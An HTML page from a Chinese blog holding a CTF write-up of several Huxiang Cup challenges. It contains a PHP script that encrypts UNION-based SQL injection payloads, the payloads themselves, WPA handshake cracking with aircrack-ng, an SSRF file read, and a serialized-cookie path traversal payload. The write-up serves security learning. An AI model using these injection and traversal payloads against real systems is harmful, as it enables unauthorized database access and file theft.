@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="code check看题目提示，应该是源码审计的问题，但是不知道源码，所以御剑扫一下，得到了一个地址下载list.zip解压得到源码如下：123456789101112131415161718192021&amp;lt;?phpheader(&amp;apos;content-type:text/html;charset=utf-8&amp;apos;);require_once &amp;apos;../config.php&amp;">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="湖湘杯部分题目wp">
+<meta property="og:url" content="http://yoursite.com/2018/11/18/湖湘杯/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="code check看题目提示，应该是源码审计的问题，但是不知道源码，所以御剑扫一下，得到了一个地址下载list.zip解压得到源码如下：123456789101112131415161718192021&amp;lt;?phpheader(&amp;apos;content-type:text/html;charset=utf-8&amp;apos;);require_once &amp;apos;../config.php&amp;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-187c65654fc4668e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-da87929472b6683b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-693a9247023ef529.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-3c48f6ef3e8e848b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b93a2acc7f96a0f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-bd6a6c98d4e5143e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9eb1f03f3a91d55d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-0ac0f443ecdad8cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-455d3485db193530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-908da1e59584a9de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-50607bc371e0ee34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-fb8e46398456389e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7502d4cea99264f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9edeae0e8e4db53e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-fd964fd2545965a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5b140de693b12fb9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9db832ecf3d49cef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-781c4e80a40b5706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-8a8e538c15e768b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-e7d10ba3cb8d6bd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-884e7269d49b35cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2d2449dd60dab347.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-11-18T13:33:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="湖湘杯部分题目wp">
+<meta name="twitter:description" content="code check看题目提示，应该是源码审计的问题，但是不知道源码，所以御剑扫一下，得到了一个地址下载list.zip解压得到源码如下：123456789101112131415161718192021&amp;lt;?phpheader(&amp;apos;content-type:text/html;charset=utf-8&amp;apos;);require_once &amp;apos;../config.php&amp;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-187c65654fc4668e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/18/湖湘杯/">
+
+
+
+
+
+  <title>湖湘杯部分题目wp | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/湖湘杯/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">湖湘杯部分题目wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T14:19:15+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="code-check"><a href="#code-check" class="headerlink" title="code check"></a>code check</h1><p>看题目提示，应该是源码审计的问题，但是不知道源码，所以御剑扫一下，得到了一个地址<br><img src="https://upload-images.jianshu.io/upload_images/11234137-187c65654fc4668e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-187c65654fc4668e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>下载list.zip解压得到源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">require_once &apos;../config.php&apos;;</span><br><span class="line">//解密过程</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	if(substr(trim($data),-7)!==&apos;hxb2018&apos;)&#123;</span><br><span class="line">		echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return substr(trim($data),0,strlen(trim($data))-7);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;select id,title,content,time from notice where id=$id&quot;;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大致的过程就是GET传参id，显示传入的id首先是经过两次base64解密密，然后经过了AES的CBC解密密。所以我们在构造id的时候，首先要把id进行一次AES CBC模式加密，然后再进行两次base64加密,并且构造的id后面必须跟着hxb2018。自己搭建环境，构造id。我搭建的脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	if(substr(trim($data),-7)!==&apos;hxb2018&apos;)&#123;</span><br><span class="line">		echo &apos;!!!!!!!!!!!!!!!!!!!!!!!!!!!&apos;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return substr(trim($data),0,strlen(trim($data))-7);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function encode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	$da = mcrypt_generic($td,$data);</span><br><span class="line">	//echo $da;</span><br><span class="line">	//echo &quot;xxxxxx&quot;;</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	echo(mdecrypt_generic($td,$da));</span><br><span class="line">	$data=base64_encode(base64_encode($da));</span><br><span class="line">	//echo $data;</span><br><span class="line">	//echo(&quot;yyyyyyyyy&quot;);</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	return trim($data);</span><br><span class="line">&#125;</span><br><span class="line">//$p=&quot;-1 union select 1,2,3,4#hxb2018&quot;;</span><br><span class="line">//$p=&quot;-1 union select 1,length(&apos;table_schema&apos;),user(),4#hxb2018&quot;;</span><br><span class="line">//table_name from information_schema.tables where table_schema=database()</span><br><span class="line">//$p=&quot;-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;notice2&apos;),user(),4#hxb2018&quot;;</span><br><span class="line">$p=&quot;-1 union select 1,(select group_concat(id) from notice),(select group_concat(title) from notice2),4#hxb2018&quot;;</span><br><span class="line">$x=encode($p);</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后就是一套sql注入的操作了。确定有回显的位数：payload:-1 union select 1,2,3,4#hxb2018<br><img src="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-105b6ce56835f484.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>确定了第二位第三位可以回显，然后爆表：payload:-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database(),4#hxb2018<br><img src="https://upload-images.jianshu.io/upload_images/11234137-da87929472b6683b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-da87929472b6683b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-693a9247023ef529.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-693a9247023ef529.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>爆列名：-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’notice2’),user(),4#hxb2018<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3c48f6ef3e8e848b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-3c48f6ef3e8e848b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-b93a2acc7f96a0f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b93a2acc7f96a0f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>爆内容：-1 union select 1,(select group_concat(id) from notice),(select group_concat(title) from notice2),4#hxb2018<br><img src="https://upload-images.jianshu.io/upload_images/11234137-bd6a6c98d4e5143e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-bd6a6c98d4e5143e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-9eb1f03f3a91d55d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9eb1f03f3a91d55d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这个题有一点坑，我最初是直接爆了stormgroup_member的内容，爆出来两个用户的用户名和密码，但是登陆界面一直登陆不上，最后才想起来爆notice2，然后出的flag。应该用sqlmap跑的</p>
+<h1 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h1><p>之前做过一次无限wifi破解的流量分析题目，用到的工具是aircrack-ng，但是这个题相比之前那个来说有点坑。首先wireshark打开流量包，看到TP-LinkT协议，先用aircrack-ng分析一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-0ac0f443ecdad8cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-0ac0f443ecdad8cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>得到SSID，然后wireshark过滤，过滤语句为wlan.fc.type_subtype== 0x0008&amp;&amp;wlan.ssid==ctf，没有得到什么有用的信息。本来以为可以得到密码的信息之类的。再过滤一下握手包看一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-455d3485db193530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-455d3485db193530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这里能看到的是wifi连接最底层的信息，由于是wpa，所以使用字典爆破一下。之前做题的时候用的字典在这个题上失效了，没跑出来。又找了几个字典爆破，还是没爆出来。其中一个已经有一百万个数据了，刚开始已经要放弃了，最后找了一个40M的txt字典在后台跑着，没想到跑出来了。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-908da1e59584a9de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-908da1e59584a9de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后就是aircrack-ng命令解密，但是这个文件用平常的aircrack-ng -p password1 -e ctf ctf.pcap搞不出来。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-50607bc371e0ee34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-50607bc371e0ee34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>只能在官网求psk然后导入<br><img src="https://upload-images.jianshu.io/upload_images/11234137-fb8e46398456389e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-fb8e46398456389e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>Wireshark导入协议，输入psk之后。尝试过滤一下http.request.method==GET，发现flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7502d4cea99264f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7502d4cea99264f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-9edeae0e8e4db53e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9edeae0e8e4db53e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="Readflag"><a href="#Readflag" class="headerlink" title="Readflag"></a>Readflag</h1><p>本题提示是ssrf<br><img src="https://upload-images.jianshu.io/upload_images/11234137-fd964fd2545965a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-fd964fd2545965a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>最普通的ssrf，但是本题最坑的是不知道路径在哪。最后才出来是/var/www/html/ssrf/flag真坑<br><img src="https://upload-images.jianshu.io/upload_images/11234137-5b140de693b12fb9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5b140de693b12fb9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="MyNote"><a href="#MyNote" class="headerlink" title="MyNote"></a>MyNote</h1><p>这个题是安恒杯六月赛的原题<br>首先扫描一波，扫出来了robots.txt<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9db832ecf3d49cef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9db832ecf3d49cef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>发现flag.php不过是个假的flag。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-781c4e80a40b5706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-781c4e80a40b5706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>那么如何得到真的flag呢<br>首先注册，登陆，然后发现上传点，上传一个jpg文件。然后抓picture的包，发现cookie里面又base64的码<br><img src="https://upload-images.jianshu.io/upload_images/11234137-8a8e538c15e768b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-8a8e538c15e768b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>解码发现是反序列化问题<br><img src="https://upload-images.jianshu.io/upload_images/11234137-e7d10ba3cb8d6bd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-e7d10ba3cb8d6bd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>构造数组类型的序列化字符串然后base64编码，脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $a[] = &apos;../../flag.php&apos;;</span><br><span class="line">echo urlencode(base64_encode(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后将得到的字符串替换掉cookie里面的picture，Go一下<br><img src="https://upload-images.jianshu.io/upload_images/11234137-884e7269d49b35cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-884e7269d49b35cb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>将返回值base64解码，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-2d2449dd60dab347.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2d2449dd60dab347.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/17/2018高校网络安全信息安全管理运维挑战赛/" rel="next" title="2018高校网络信息安全管理运维挑战赛wp">
+                <i class="fa fa-chevron-left"></i> 2018高校网络信息安全管理运维挑战赛wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/21/CBC字节反转攻击问题/" rel="prev" title="CBC反转攻击问题">
+                CBC反转攻击问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
